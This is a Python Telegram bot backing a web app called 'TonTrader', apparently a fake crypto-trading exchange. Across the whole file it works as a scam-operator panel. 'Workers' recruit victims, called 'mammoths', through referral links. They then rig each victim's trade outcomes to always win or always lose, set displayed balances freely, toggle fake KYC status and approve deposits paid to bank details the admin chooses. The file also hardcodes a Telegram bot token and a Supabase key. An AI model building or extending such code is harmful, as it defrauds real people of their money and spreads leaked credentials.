import asyncio
import logging
import sys
from aiohttp import web
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command, CommandStart, CommandObject
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.context import FSMContext
from aiogram.utils.keyboard import InlineKeyboardBuilder
from supabase import create_client, Client

# ==========================================
# ⚙️ КОНФИГУРАЦИЯ
# ==========================================
# 🤖 TELEGRAM BOT
BOT_TOKEN = "7769124785:AAE46Zt6jh9IPVt4IB4u0j8kgEVg2NpSYa0"
ADMIN_ID = 844012884

# 🔐 SUPABASE (ТЕ ЖЕ ДАННЫЕ, ЧТО И ДЛЯ REACT!)
# URL проекта (одинаковый для бота и сайта)
SUPABASE_URL = "https://wzpywfedbowlosmvecos.supabase.co"
SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Ind6cHl3ZmVkYm93bG9zbXZlY29zIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjYzNTAyMzksImV4cCI6MjA4MTkyNjIzOX0.TmAYsmA8iwSpLPKOHIZM7jf3GLE3oeT7wD-l0ALwBPw"

# 🌐 WEBAPP
WEBAPP_URL = "https://tontrade-web.vercel.app/"
API_PORT = 8080

# Инициализация
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()
supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)

logging.basicConfig(level=logging.INFO, stream=sys.stdout)

# ==========================================
# 🧊 FSM STATES
# ==========================================
class WorkerStates(StatesGroup):
    changing_balance = State()
    sending_message = State()

class AdminStates(StatesGroup):
    changing_support = State()
    changing_bank = State()

# ==========================================
# 🗄 DATABASE FUNCTIONS
# ==========================================
def db_get_user(user_id):
    res = supabase.table("users").select("*").eq("user_id", user_id).execute()
    return res.data[0] if res.data else None

async def get_user_photo_url(user_id):
    """Получает URL фото профиля пользователя через Bot API"""
    try:
        photos = await bot.get_user_profile_photos(user_id, limit=1)
        if photos.total_count > 0:
            file = await bot.get_file(photos.photos[0][0].file_id)
            return f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file.file_path}"
    except Exception as e:
        logging.error(f"Error getting photo: {e}")
    return None

def db_upsert_user(user_id, username, full_name, referrer_id=None, photo_url=None):
    existing = db_get_user(user_id)
    
    user_data = {
        "user_id": user_id,
        "username": f"@{username}" if username else "No Username",
        "full_name": full_name
    }
    
    if photo_url:
        user_data["photo_url"] = photo_url
    
    if existing:
        supabase.table("users").update(user_data).eq("user_id", user_id).execute()
        return False
    else:
        user_data["referrer_id"] = referrer_id
        user_data["balance"] = 0
        user_data["luck"] = "default"
        user_data["is_kyc"] = False
        user_data["web_registered"] = False
        supabase.table("users").insert(user_data).execute()
        return True

def db_update_field(user_id, field, value):
    supabase.table("users").update({field: value}).eq("user_id", user_id).execute()

def db_get_mammoths(worker_id):
    res = supabase.table("users").select("*").eq("referrer_id", worker_id).execute()
    return res.data

def db_get_settings():
    try:
        res = supabase.table("settings").select("*").limit(1).execute()
        if res.data and len(res.data) > 0:
            logging.info(f"Settings loaded: {res.data[0]}")
            return res.data[0]
        else:
            logging.warning("No settings found in database")
            return {"support_username": "support", "bank_details": "Не указано"}
    except Exception as e:
        logging.error(f"Error getting settings: {e}")
        return {"support_username": "support", "bank_details": "Не указано"}

def db_update_settings(field, value):
    try:
        current = db_get_settings()
        if current.get('id'):
            logging.info(f"Updating settings: {field} = {value}")
            result = supabase.table("settings").update({field: value}).eq("id", current['id']).execute()
            logging.info(f"Settings update result: {result}")
            return True
        else:
            logging.error("No settings ID found, cannot update")
            return False
    except Exception as e:
        logging.error(f"Error updating settings: {e}")
        return False

# ==========================================
# 🎹 KEYBOARDS
# ==========================================
def kb_start(support_username, user_id):
    builder = InlineKeyboardBuilder()
    # Передаём user_id через URL для надёжной идентификации
    webapp_url_with_id = f"{WEBAPP_URL}?tgid={user_id}"
    builder.button(text="� Открытtь TonTrader", web_app=types.WebAppInfo(url=webapp_url_with_id))
    clean_support = support_username.replace("@", "")
    builder.button(text="💬 Support", url=f"https://t.me/{clean_support}")
    builder.adjust(1)
    return builder.as_markup()

def kb_worker():
    builder = InlineKeyboardBuilder()
    builder.button(text="🦣 Мои мамонты", callback_data="my_mammoths")
    builder.adjust(1)
    return builder.as_markup()

def kb_mammoth_control(user_id, luck, is_kyc):
    builder = InlineKeyboardBuilder()
    luck_map = {"win": "🟢 ВИН", "lose": "🔴 ЛУЗ", "default": "🎲 РАНДОМ"}
    builder.button(text=f"Удача: {luck_map.get(luck, '🎲')}", callback_data=f"menu_luck_{user_id}")
    builder.button(text="💰 Изменить баланс", callback_data=f"set_balance_{user_id}")
    kyc_text = "🛡 Убрать KYC" if is_kyc else "🛡 Дать KYC"
    builder.button(text=kyc_text, callback_data=f"toggle_kyc_{user_id}")
    builder.button(text="✉️ Написать", callback_data=f"send_msg_{user_id}")
    builder.button(text="🔙 Назад", callback_data="my_mammoths")
    builder.adjust(1)
    return builder.as_markup()

def kb_luck_select(user_id):
    builder = InlineKeyboardBuilder()
    builder.button(text="🟢 Всегда ВИН", callback_data=f"set_luck_{user_id}_win")
    builder.button(text="🔴 Всегда ЛУЗ", callback_data=f"set_luck_{user_id}_lose")
    builder.button(text="🎲 Рандом", callback_data=f"set_luck_{user_id}_default")
    builder.button(text="🔙 Назад", callback_data=f"open_mammoth_{user_id}")
    builder.adjust(1)
    return builder.as_markup()

def kb_admin():
    builder = InlineKeyboardBuilder()
    builder.button(text="✏️ Изменить Support", callback_data="adm_sup")
    builder.button(text="💳 Изменить Реквизиты", callback_data="adm_bank")
    builder.adjust(1)
    return builder.as_markup()

# ==========================================
# 🚀 /start
# ==========================================
@dp.message(CommandStart())
async def cmd_start(message: types.Message, command: CommandObject):
    user_id = message.from_user.id
    username = message.from_user.username
    full_name = message.from_user.full_name
    
    # Получаем фото профиля
    photo_url = await get_user_photo_url(user_id)
    
    # Определяем реферера
    referrer_id = None
    if command.args and command.args.isdigit():
        possible_ref = int(command.args)
        if possible_ref != user_id and db_get_user(possible_ref):
            referrer_id = possible_ref

    # Регистрируем (с фото)
    is_new = db_upsert_user(user_id, username, full_name, referrer_id, photo_url)

    # Уведомляем воркера
    if is_new and referrer_id:
        try:
            notify_text = (
                "🦣 <b>НОВЫЙ МАМОНТ!</b>\n"
                f"👤 @{username or 'Нет ника'} ({user_id})\n"
                f"📱 {full_name}"
            )
            await bot.send_message(referrer_id, notify_text, parse_mode="HTML")
        except Exception as e:
            logging.error(f"Notify error: {e}")
    settings = db_get_settings()
    welcome = (
        "🚀 <b>Добро пожаловать в TonTrader!</b>\n\n"
        "Современная трейдинговая платформа с удобной интеграцией в Telegram.\n"
        "Торгуй быстро, безопасно и без лишних шагов.\n\n"
        "👇 Нажми кнопку ниже, чтобы открыть биржу и начать"
    )
    
    # Отправляем фото с приветствием
    # Используем URL изображения вместо локального файла для надежности на хостинге
    photo_url = "https://i.imgur.com/your-image.jpg"  # Замените на ваш URL
    
    # Альтернативно можно использовать локальный файл:
    # from aiogram.types import FSInputFile
    # import os
    # photo_path = os.path.join(os.path.dirname(__file__), "welcome.jpg")
    
    try:
        # Используем локальный файл
        from aiogram.types import FSInputFile
        import os
        photo_path = os.path.join(os.path.dirname(__file__), "welcome.jpg")
        
        if os.path.exists(photo_path) and os.path.isfile(photo_path):
            photo = FSInputFile(photo_path)
            await message.answer_photo(photo, caption=welcome, parse_mode="HTML", reply_markup=kb_start(settings.get('support_username', 'support'), user_id))
        else:
            logging.warning(f"Photo file not found: {photo_path}")
            await message.answer(welcome, parse_mode="HTML", reply_markup=kb_start(settings.get('support_username', 'support'), user_id))
        
    except Exception as e:
        logging.error(f"Error sending photo: {e}")
        # Если фото не отправилось, отправляем текст без фото
        await message.answer(welcome, parse_mode="HTML", reply_markup=kb_start(settings.get('support_username', 'support'), user_id))

# ==========================================
# ⚡️ /worker
# ==========================================
@dp.message(Command("worker"))
async def cmd_worker(message: types.Message):
    user_id = message.from_user.id
    mammoths = db_get_mammoths(user_id)
    count = len(mammoths) if mammoths else 0
    
    bot_info = await bot.get_me()
    ref_link = f"https://t.me/{bot_info.username}?start={user_id}"
    
    text = (
        "⚡️ <b>WORKER PANEL</b>\n\n"
        f"👤 ID: <code>{user_id}</code>\n"
        f"🦣 Мамонтов: {count}\n\n"
        f"🔗 Реф-ссылка:\n<code>{ref_link}</code>"
    )
    await message.answer(text, parse_mode="HTML", reply_markup=kb_worker())

@dp.callback_query(F.data == "my_mammoths")
async def show_mammoths(call: types.CallbackQuery):
    mammoths = db_get_mammoths(call.from_user.id)
    
    builder = InlineKeyboardBuilder()
    if mammoths:
        for m in mammoths:
            label = f"{m.get('full_name', 'User')} | {m.get('balance', 0)}$"
            builder.button(text=label, callback_data=f"open_mammoth_{m['user_id']}")
    else:
        builder.button(text="Пока нет мамонтов", callback_data="ignore")
    builder.button(text="🔙 Назад", callback_data="back_worker")
    builder.adjust(1)
    
    await call.message.edit_text("🦣 <b>Ваши мамонты:</b>", parse_mode="HTML", reply_markup=builder.as_markup())

@dp.callback_query(F.data == "back_worker")
async def back_worker(call: types.CallbackQuery):
    user_id = call.from_user.id
    mammoths = db_get_mammoths(user_id)
    count = len(mammoths) if mammoths else 0
    
    bot_info = await bot.get_me()
    ref_link = f"https://t.me/{bot_info.username}?start={user_id}"
    
    text = (
        "⚡️ <b>WORKER PANEL</b>\n\n"
        f"👤 ID: <code>{user_id}</code>\n"
        f"🦣 Мамонтов: {count}\n\n"
        f"🔗 Реф-ссылка:\n<code>{ref_link}</code>"
    )
    await call.message.edit_text(text, parse_mode="HTML", reply_markup=kb_worker())

@dp.callback_query(F.data.startswith("open_mammoth_"))
async def open_mammoth(call: types.CallbackQuery):
    target_id = int(call.data.split("_")[2])
    m = db_get_user(target_id)
    
    if not m:
        await call.answer("Мамонт не найден", show_alert=True)
        return
    
    text = (
        "🦣 <b>ПРОФИЛЬ МАМОНТА</b>\n"
        "➖➖➖➖➖➖➖\n"
        f"👤 {m.get('username', 'Нет')} ({m['user_id']})\n"
        f"📱 {m.get('full_name', '-')}\n"
        f"💰 Баланс: <b>{m.get('balance', 0)} USD</b>\n"
        f"🍀 Удача: <b>{m.get('luck', 'default').upper()}</b>\n"
        f"🛡 KYC: {'✅' if m.get('is_kyc') else '❌'}"
    )
    await call.message.edit_text(text, parse_mode="HTML", reply_markup=kb_mammoth_control(target_id, m.get('luck'), m.get('is_kyc')))

# === LUCK ===
@dp.callback_query(F.data.startswith("menu_luck_"))
async def menu_luck(call: types.CallbackQuery):
    target_id = int(call.data.split("_")[2])
    await call.message.edit_text("🍀 Выберите удачу:", reply_markup=kb_luck_select(target_id))

@dp.callback_query(F.data.startswith("set_luck_"))
async def set_luck(call: types.CallbackQuery):
    parts = call.data.split("_")
    target_id = int(parts[2])
    mode = parts[3]
    db_update_field(target_id, "luck", mode)
    await call.answer(f"Удача: {mode.upper()}")
    
    # Возврат в профиль
    m = db_get_user(target_id)
    text = (
        "🦣 <b>ПРОФИЛЬ МАМОНТА</b>\n"
        "➖➖➖➖➖➖➖\n"
        f"👤 {m.get('username', 'Нет')} ({m['user_id']})\n"
        f"📱 {m.get('full_name', '-')}\n"
        f"💰 Баланс: <b>{m.get('balance', 0)} USD</b>\n"
        f"🍀 Удача: <b>{m.get('luck', 'default').upper()}</b>\n"
        f"🛡 KYC: {'✅' if m.get('is_kyc') else '❌'}"
    )
    await call.message.edit_text(text, parse_mode="HTML", reply_markup=kb_mammoth_control(target_id, m.get('luck'), m.get('is_kyc')))

# === KYC ===
@dp.callback_query(F.data.startswith("toggle_kyc_"))
async def toggle_kyc(call: types.CallbackQuery):
    target_id = int(call.data.split("_")[2])
    user = db_get_user(target_id)
    new_status = not user.get('is_kyc')
    db_update_field(target_id, "is_kyc", new_status)
    await call.answer("KYC изменен!")
    
    m = db_get_user(target_id)
    text = (
        "🦣 <b>ПРОФИЛЬ МАМОНТА</b>\n"
        "➖➖➖➖➖➖➖\n"
        f"👤 {m.get('username', 'Нет')} ({m['user_id']})\n"
        f"📱 {m.get('full_name', '-')}\n"
        f"💰 Баланс: <b>{m.get('balance', 0)} USD</b>\n"
        f"🍀 Удача: <b>{m.get('luck', 'default').upper()}</b>\n"
        f"🛡 KYC Верефикация: {'✅' if m.get('is_kyc') else '❌'}"
    )
    await call.message.edit_text(text, parse_mode="HTML", reply_markup=kb_mammoth_control(target_id, m.get('luck'), m.get('is_kyc')))

# === BALANCE ===
@dp.callback_query(F.data.startswith("set_balance_"))
async def ask_balance(call: types.CallbackQuery, state: FSMContext):
    target_id = int(call.data.split("_")[2])
    await state.update_data(target_id=target_id)
    await state.set_state(WorkerStates.changing_balance)
    await call.message.edit_text("💰 Введите новый баланс:")

@dp.message(WorkerStates.changing_balance)
async def set_balance(message: types.Message, state: FSMContext):
    try:
        new_balance = float(message.text)
        data = await state.get_data()
        target_id = data['target_id']
        db_update_field(target_id, "balance", new_balance)
        await message.answer(f"✅ Баланс изменен на {new_balance}")
        await state.clear()
    except ValueError:
        await message.answer("❌ Введите число!")

# === SEND MESSAGE ===
@dp.callback_query(F.data.startswith("send_msg_"))
async def ask_msg(call: types.CallbackQuery, state: FSMContext):
    target_id = int(call.data.split("_")[2])
    await state.update_data(target_id=target_id)
    await state.set_state(WorkerStates.sending_message)
    await call.message.edit_text("✉️ Введите сообщение:")

@dp.message(WorkerStates.sending_message)
async def send_msg(message: types.Message, state: FSMContext):
    data = await state.get_data()
    target_id = data['target_id']
    try:
        await bot.send_message(target_id, f"🔔 <b>Уведомление</b>\n\n{message.text}", parse_mode="HTML")
        await message.answer("✅ Отправлено!")
    except:
        await message.answer("❌ Ошибка отправки")
    await state.clear()

# ==========================================
# 👑 /admin
# ==========================================
@dp.message(Command("admin"))
async def cmd_admin(message: types.Message):
    logging.info(f"/admin from {message.from_user.id}, ADMIN_ID={ADMIN_ID}")
    if message.from_user.id != ADMIN_ID:
        await message.answer("❌ Нет доступа")
        return
    
    settings = db_get_settings()
    text = (
        "👑 <b>ADMIN PANEL</b>\n\n"
        f"Support: {settings.get('support_username')}\n"
        f"Реквизиты: {settings.get('bank_details')}"
    )
    await message.answer(text, parse_mode="HTML", reply_markup=kb_admin())

@dp.callback_query(F.data == "adm_sup")
async def adm_sup(call: types.CallbackQuery, state: FSMContext):
    await state.set_state(AdminStates.changing_support)
    await call.message.edit_text("Введите @username саппорта:")

@dp.message(AdminStates.changing_support)
async def save_sup(message: types.Message, state: FSMContext):
    success = db_update_settings("support_username", message.text)
    if success:
        await message.answer(f"✅ Support обновлен на: {message.text}")
    else:
        await message.answer("❌ Ошибка обновления. Проверьте логи.")
    await state.clear()

@dp.callback_query(F.data == "adm_bank")
async def adm_bank(call: types.CallbackQuery, state: FSMContext):
    await state.set_state(AdminStates.changing_bank)
    await call.message.edit_text("Введите реквизиты:")

@dp.message(AdminStates.changing_bank)
async def save_bank(message: types.Message, state: FSMContext):
    success = db_update_settings("bank_details", message.text)
    if success:
        await message.answer(f"✅ Реквизиты обновлены:\n{message.text}")
    else:
        await message.answer("❌ Ошибка обновления. Проверьте логи.")
    await state.clear()

@dp.callback_query(F.data == "ignore")
async def ignore(call: types.CallbackQuery):
    await call.answer()

# ==========================================
# 💰 ОБРАБОТКА ПОПОЛНЕНИЙ
# ==========================================
@dp.callback_query(F.data.startswith("approve_deposit_"))
async def approve_deposit(call: types.CallbackQuery):
    """Подтверждение пополнения воркером"""
    deposit_id = int(call.data.split("_")[2])
    
    try:
        # Получаем информацию о запросе
        res = supabase.table("deposit_requests").select("*").eq("id", deposit_id).single().execute()
        
        if not res.data:
            await call.answer("❌ Запрос не найден", show_alert=True)
            return
        
        request = res.data
        
        if request['status'] != 'pending':
            await call.answer("⚠️ Запрос уже обработан", show_alert=True)
            return
        
        # Обновляем статус запроса
        supabase.table("deposit_requests").update({
            'status': 'approved',
            'processed_at': 'now()'
        }).eq("id", deposit_id).execute()
        
        # Начисляем баланс пользователю
        user_id = request['user_id']
        amount_usd = request['amount_usd']
        
        user_data = db_get_user(user_id)
        if user_data:
            new_balance = user_data.get('balance', 0) + amount_usd
            db_update_field(user_id, 'balance', new_balance)
        
        # Обновляем сообщение
        await call.message.edit_text(
            f"{call.message.text}\n\n✅ <b>ПОДТВЕРЖДЕНО</b>\n"
            f"💵 Зачислено: ${amount_usd:.2f}",
            parse_mode="HTML"
        )
        
        await call.answer("✅ Пополнение подтверждено!")
        
        # Уведомляем пользователя
        try:
            await bot.send_message(
                user_id,
                f"✅ <b>Пополнение подтверждено!</b>\n\n"
                f"💰 На ваш счет зачислено: <b>${amount_usd:.2f}</b>\n"
                f"📊 Можете начинать торговать!",
                parse_mode="HTML"
            )
        except Exception as e:
            logging.error(f"Failed to notify user: {e}")
            
    except Exception as e:
        logging.error(f"Error approving deposit: {e}")
        await call.answer("❌ Ошибка обработки", show_alert=True)

@dp.callback_query(F.data.startswith("reject_deposit_"))
async def reject_deposit(call: types.CallbackQuery):
    """Отклонение пополнения воркером"""
    deposit_id = int(call.data.split("_")[2])
    
    try:
        # Получаем информацию о запросе
        res = supabase.table("deposit_requests").select("*").eq("id", deposit_id).single().execute()
        
        if not res.data:
            await call.answer("❌ Запрос не найден", show_alert=True)
            return
        
        request = res.data
        
        if request['status'] != 'pending':
            await call.answer("⚠️ Запрос уже обработан", show_alert=True)
            return
        
        # Обновляем статус запроса
        supabase.table("deposit_requests").update({
            'status': 'rejected',
            'processed_at': 'now()'
        }).eq("id", deposit_id).execute()
        
        # Обновляем сообщение
        await call.message.edit_text(
            f"{call.message.text}\n\n❌ <b>ОТКЛОНЕНО</b>",
            parse_mode="HTML"
        )
        
        await call.answer("❌ Пополнение отклонено")
        
        # Уведомляем пользователя
        user_id = request['user_id']
        try:
            await bot.send_message(
                user_id,
                f"❌ <b>Пополнение отклонено</b>\n\n"
                f"Ваш запрос на пополнение был отклонен.\n"
                f"Если вы считаете это ошибкой, обратитесь в поддержку.",
                parse_mode="HTML"
            )
        except Exception as e:
            logging.error(f"Failed to notify user: {e}")
            
    except Exception as e:
        logging.error(f"Error rejecting deposit: {e}")
        await call.answer("❌ Ошибка обработки", show_alert=True)

# ==========================================
# 🧪 TEST COMMAND (для отладки)
# ==========================================
@dp.message(Command("test_settings"))
async def test_settings(message: types.Message):
    """Тестовая команда для проверки работы с настройками"""
    if message.from_user.id != ADMIN_ID:
        return
    
    try:
        # Получаем текущие настройки
        settings = db_get_settings()
        
        text = (
            "🧪 <b>ТЕСТ НАСТРОЕК</b>\n\n"
            f"ID: {settings.get('id', 'НЕТ')}\n"
            f"Support: {settings.get('support_username', 'НЕТ')}\n"
            f"Реквизиты: {settings.get('bank_details', 'НЕТ')}\n\n"
            "Проверьте логи для деталей."
        )
        await message.answer(text, parse_mode="HTML")
        
    except Exception as e:
        await message.answer(f"❌ Ошибка: {str(e)}")
        logging.error(f"Test settings error: {e}")

# ==========================================
# 🌐 API ENDPOINTS (для уведомлений от WebApp)
# ==========================================
async def handle_notify(request):
    """Обработка уведомлений от веб-приложения"""
    try:
        data = await request.json()
        event_type = data.get('type')
        user_id = data.get('user_id')
        
        if not user_id:
            return web.json_response({'error': 'user_id required'}, status=400)
        
        # Получаем пользователя и его воркера
        user = db_get_user(user_id)
        if not user:
            return web.json_response({'error': 'user not found'}, status=404)
        
        referrer_id = user.get('referrer_id')
        if not referrer_id:
            return web.json_response({'ok': True, 'message': 'no referrer'})
        
        user_name = user.get('full_name', 'Пользователь')
        user_username = user.get('username', '')
        
        # Формируем уведомление в зависимости от типа события
        if event_type == 'deal_opened':
            symbol = data.get('symbol', '???')
            deal_type = data.get('deal_type', '???')
            amount = data.get('amount', 0)
            
            emoji = "🟢" if deal_type == "Long" else "🔴"
            text = (
                f"📊 <b>НОВАЯ СДЕЛКА</b>\n\n"
                f"👤 {user_name} {user_username}\n"
                f"💎 Пара: <b>{symbol}/USDT</b>\n"
                f"{emoji} Тип: <b>{deal_type}</b>\n"
                f"💰 Сумма: <b>{amount} USDT</b>\n"
                f"⚡️ Плечо: x10"
            )
            
        elif event_type == 'deal_closed':
            symbol = data.get('symbol', '???')
            deal_type = data.get('deal_type', '???')
            amount = data.get('amount', 0)
            pnl = data.get('pnl', 0)
            is_win = data.get('is_win', False)
            
            emoji = "✅" if is_win else "❌"
            result = "ВЫИГРЫШ" if is_win else "ПРОИГРЫШ"
            pnl_sign = "+" if pnl > 0 else ""
            
            text = (
                f"{emoji} <b>СДЕЛКА ЗАКРЫТА - {result}</b>\n\n"
                f"👤 {user_name} {user_username}\n"
                f"💎 Пара: <b>{symbol}/USDT</b>\n"
                f"📈 Тип: <b>{deal_type}</b>\n"
                f"💰 Ставка: <b>{amount} USDT</b>\n"
                f"💵 Результат: <b>{pnl_sign}{pnl:.2f} USDT</b>"
            )
            
        elif event_type == 'deposit_request':
            amount_rub = data.get('amount_rub', 0)
            amount_usd = data.get('amount_usd', 0)
            method = data.get('method', 'unknown')
            deposit_id = data.get('deposit_id')
            
            if not deposit_id:
                return web.json_response({'error': 'deposit_id required'}, status=400)
            
            method_names = {
                'card': '💳 Банковская карта',
                'crypto': '₿ Криптовалюта'
            }
            method_display = method_names.get(method, method)
            
            text = (
                f"💰 <b>НОВЫЙ ЗАПРОС НА ПОПОЛНЕНИЕ</b>\n\n"
                f"👤 {user_name} {user_username}\n"
                f"💵 Сумма: <b>{amount_rub:.0f} RUB</b> (≈ ${amount_usd:.2f})\n"
                f"📋 Способ: <b>{method_display}</b>\n\n"
                f"⏳ Ожидает вашего подтверждения"
            )
            
            # Создаем клавиатуру с кнопками
            builder = InlineKeyboardBuilder()
            builder.button(text="✅ Подтвердить", callback_data=f"approve_deposit_{deposit_id}")
            builder.button(text="❌ Отклонить", callback_data=f"reject_deposit_{deposit_id}")
            builder.adjust(2)
            
            # Отправляем с клавиатурой
            try:
                await bot.send_message(referrer_id, text, parse_mode="HTML", reply_markup=builder.as_markup())
                logging.info(f"Deposit request sent to {referrer_id}: deposit_id={deposit_id}")
                return web.json_response({'ok': True})
            except Exception as e:
                logging.error(f"Failed to send deposit request: {e}")
                return web.json_response({'error': str(e)}, status=500)
            
        else:
            return web.json_response({'error': 'unknown event type'}, status=400)
        
        # Отправляем уведомление воркеру (для других типов событий)
        try:
            await bot.send_message(referrer_id, text, parse_mode="HTML")
            logging.info(f"Notification sent to {referrer_id}: {event_type}")
        except Exception as e:
            logging.error(f"Failed to send notification: {e}")
            return web.json_response({'error': str(e)}, status=500)
        
        return web.json_response({'ok': True})
        
    except Exception as e:
        logging.error(f"API error: {e}")
        return web.json_response({'error': str(e)}, status=500)

async def handle_health(request):
    """Health check endpoint"""
    return web.json_response({'status': 'ok'})

# ==========================================
# 🔥 ЗАПУСК
# ==========================================
# 🔥 ЗАПУСК
# ==========================================
async def handle_deposit_realtime():
    """Обработка новых запросов на пополнение через Supabase Realtime"""
    
    def on_deposit_insert(payload):
        """Callback для новых запросов на пополнение"""
        try:
            request = payload['new']
            deposit_id = request['id']
            user_id = request['user_id']
            worker_id = request['worker_id']
            amount_rub = request['amount_rub']
            amount_usd = request['amount_usd']
            method = request['method']
            
            if not worker_id:
                logging.warning(f"Deposit request {deposit_id} has no worker_id")
                return
            
            # Получаем информацию о пользователе
            user = db_get_user(user_id)
            if not user:
                logging.error(f"User {user_id} not found")
                return
            
            user_name = user.get('full_name', 'Пользователь')
            user_username = user.get('username', '')
            
            method_names = {
                'card': '💳 Банковская карта',
                'crypto': '₿ Криптовалюта'
            }
            method_display = method_names.get(method, method)
            
            text = (
                f"💰 <b>НОВЫЙ ЗАПРОС НА ПОПОЛНЕНИЕ</b>\n\n"
                f"👤 {user_name} {user_username}\n"
                f"💵 Сумма: <b>{amount_rub:.0f} RUB</b> (≈ ${amount_usd:.2f})\n"
                f"📋 Способ: <b>{method_display}</b>\n\n"
                f"⏳ Ожидает вашего подтверждения"
            )
            
            # Создаем клавиатуру с кнопками
            builder = InlineKeyboardBuilder()
            builder.button(text="✅ Подтвердить", callback_data=f"approve_deposit_{deposit_id}")
            builder.button(text="❌ Отклонить", callback_data=f"reject_deposit_{deposit_id}")
            builder.adjust(2)
            
            # Отправляем асинхронно
            asyncio.create_task(
                bot.send_message(worker_id, text, parse_mode="HTML", reply_markup=builder.as_markup())
            )
            logging.info(f"Deposit notification sent to worker {worker_id}: deposit_id={deposit_id}")
            
        except Exception as e:
            logging.error(f"Error handling deposit realtime: {e}")
    
    # Подписываемся на INSERT в deposit_requests
    try:
        channel = supabase.channel('deposit_requests_channel')
        channel.on_postgres_changes(
            event='INSERT',
            schema='public',
            table='deposit_requests',
            callback=on_deposit_insert
        ).subscribe()
        
        logging.info("✅ Subscribed to deposit_requests realtime updates")
        
    except Exception as e:
        logging.error(f"Failed to subscribe to deposit_requests: {e}")

async def main():
    print("🚀 Бот запущен!")
    
    # Запускаем Realtime подписку на пополнения
    await handle_deposit_realtime()
    
    # Создаём веб-сервер для API (оставляем для совместимости)
    app = web.Application()
    app.router.add_post('/api/notify', handle_notify)
    app.router.add_get('/health', handle_health)
    
    # Добавляем CORS headers
    async def cors_middleware(app, handler):
        async def middleware_handler(request):
            if request.method == 'OPTIONS':
                return web.Response(headers={
                    'Access-Control-Allow-Origin': '*',
                    'Access-Control-Allow-Methods': 'POST, GET, OPTIONS',
                    'Access-Control-Allow-Headers': 'Content-Type',
                })
            response = await handler(request)
            response.headers['Access-Control-Allow-Origin'] = '*'
            return response
        return middleware_handler
    
    app.middlewares.append(cors_middleware)
    
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', API_PORT)
    await site.start()
    print(f"🌐 API сервер запущен на порту {API_PORT}")
    
    # Запускаем бота
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
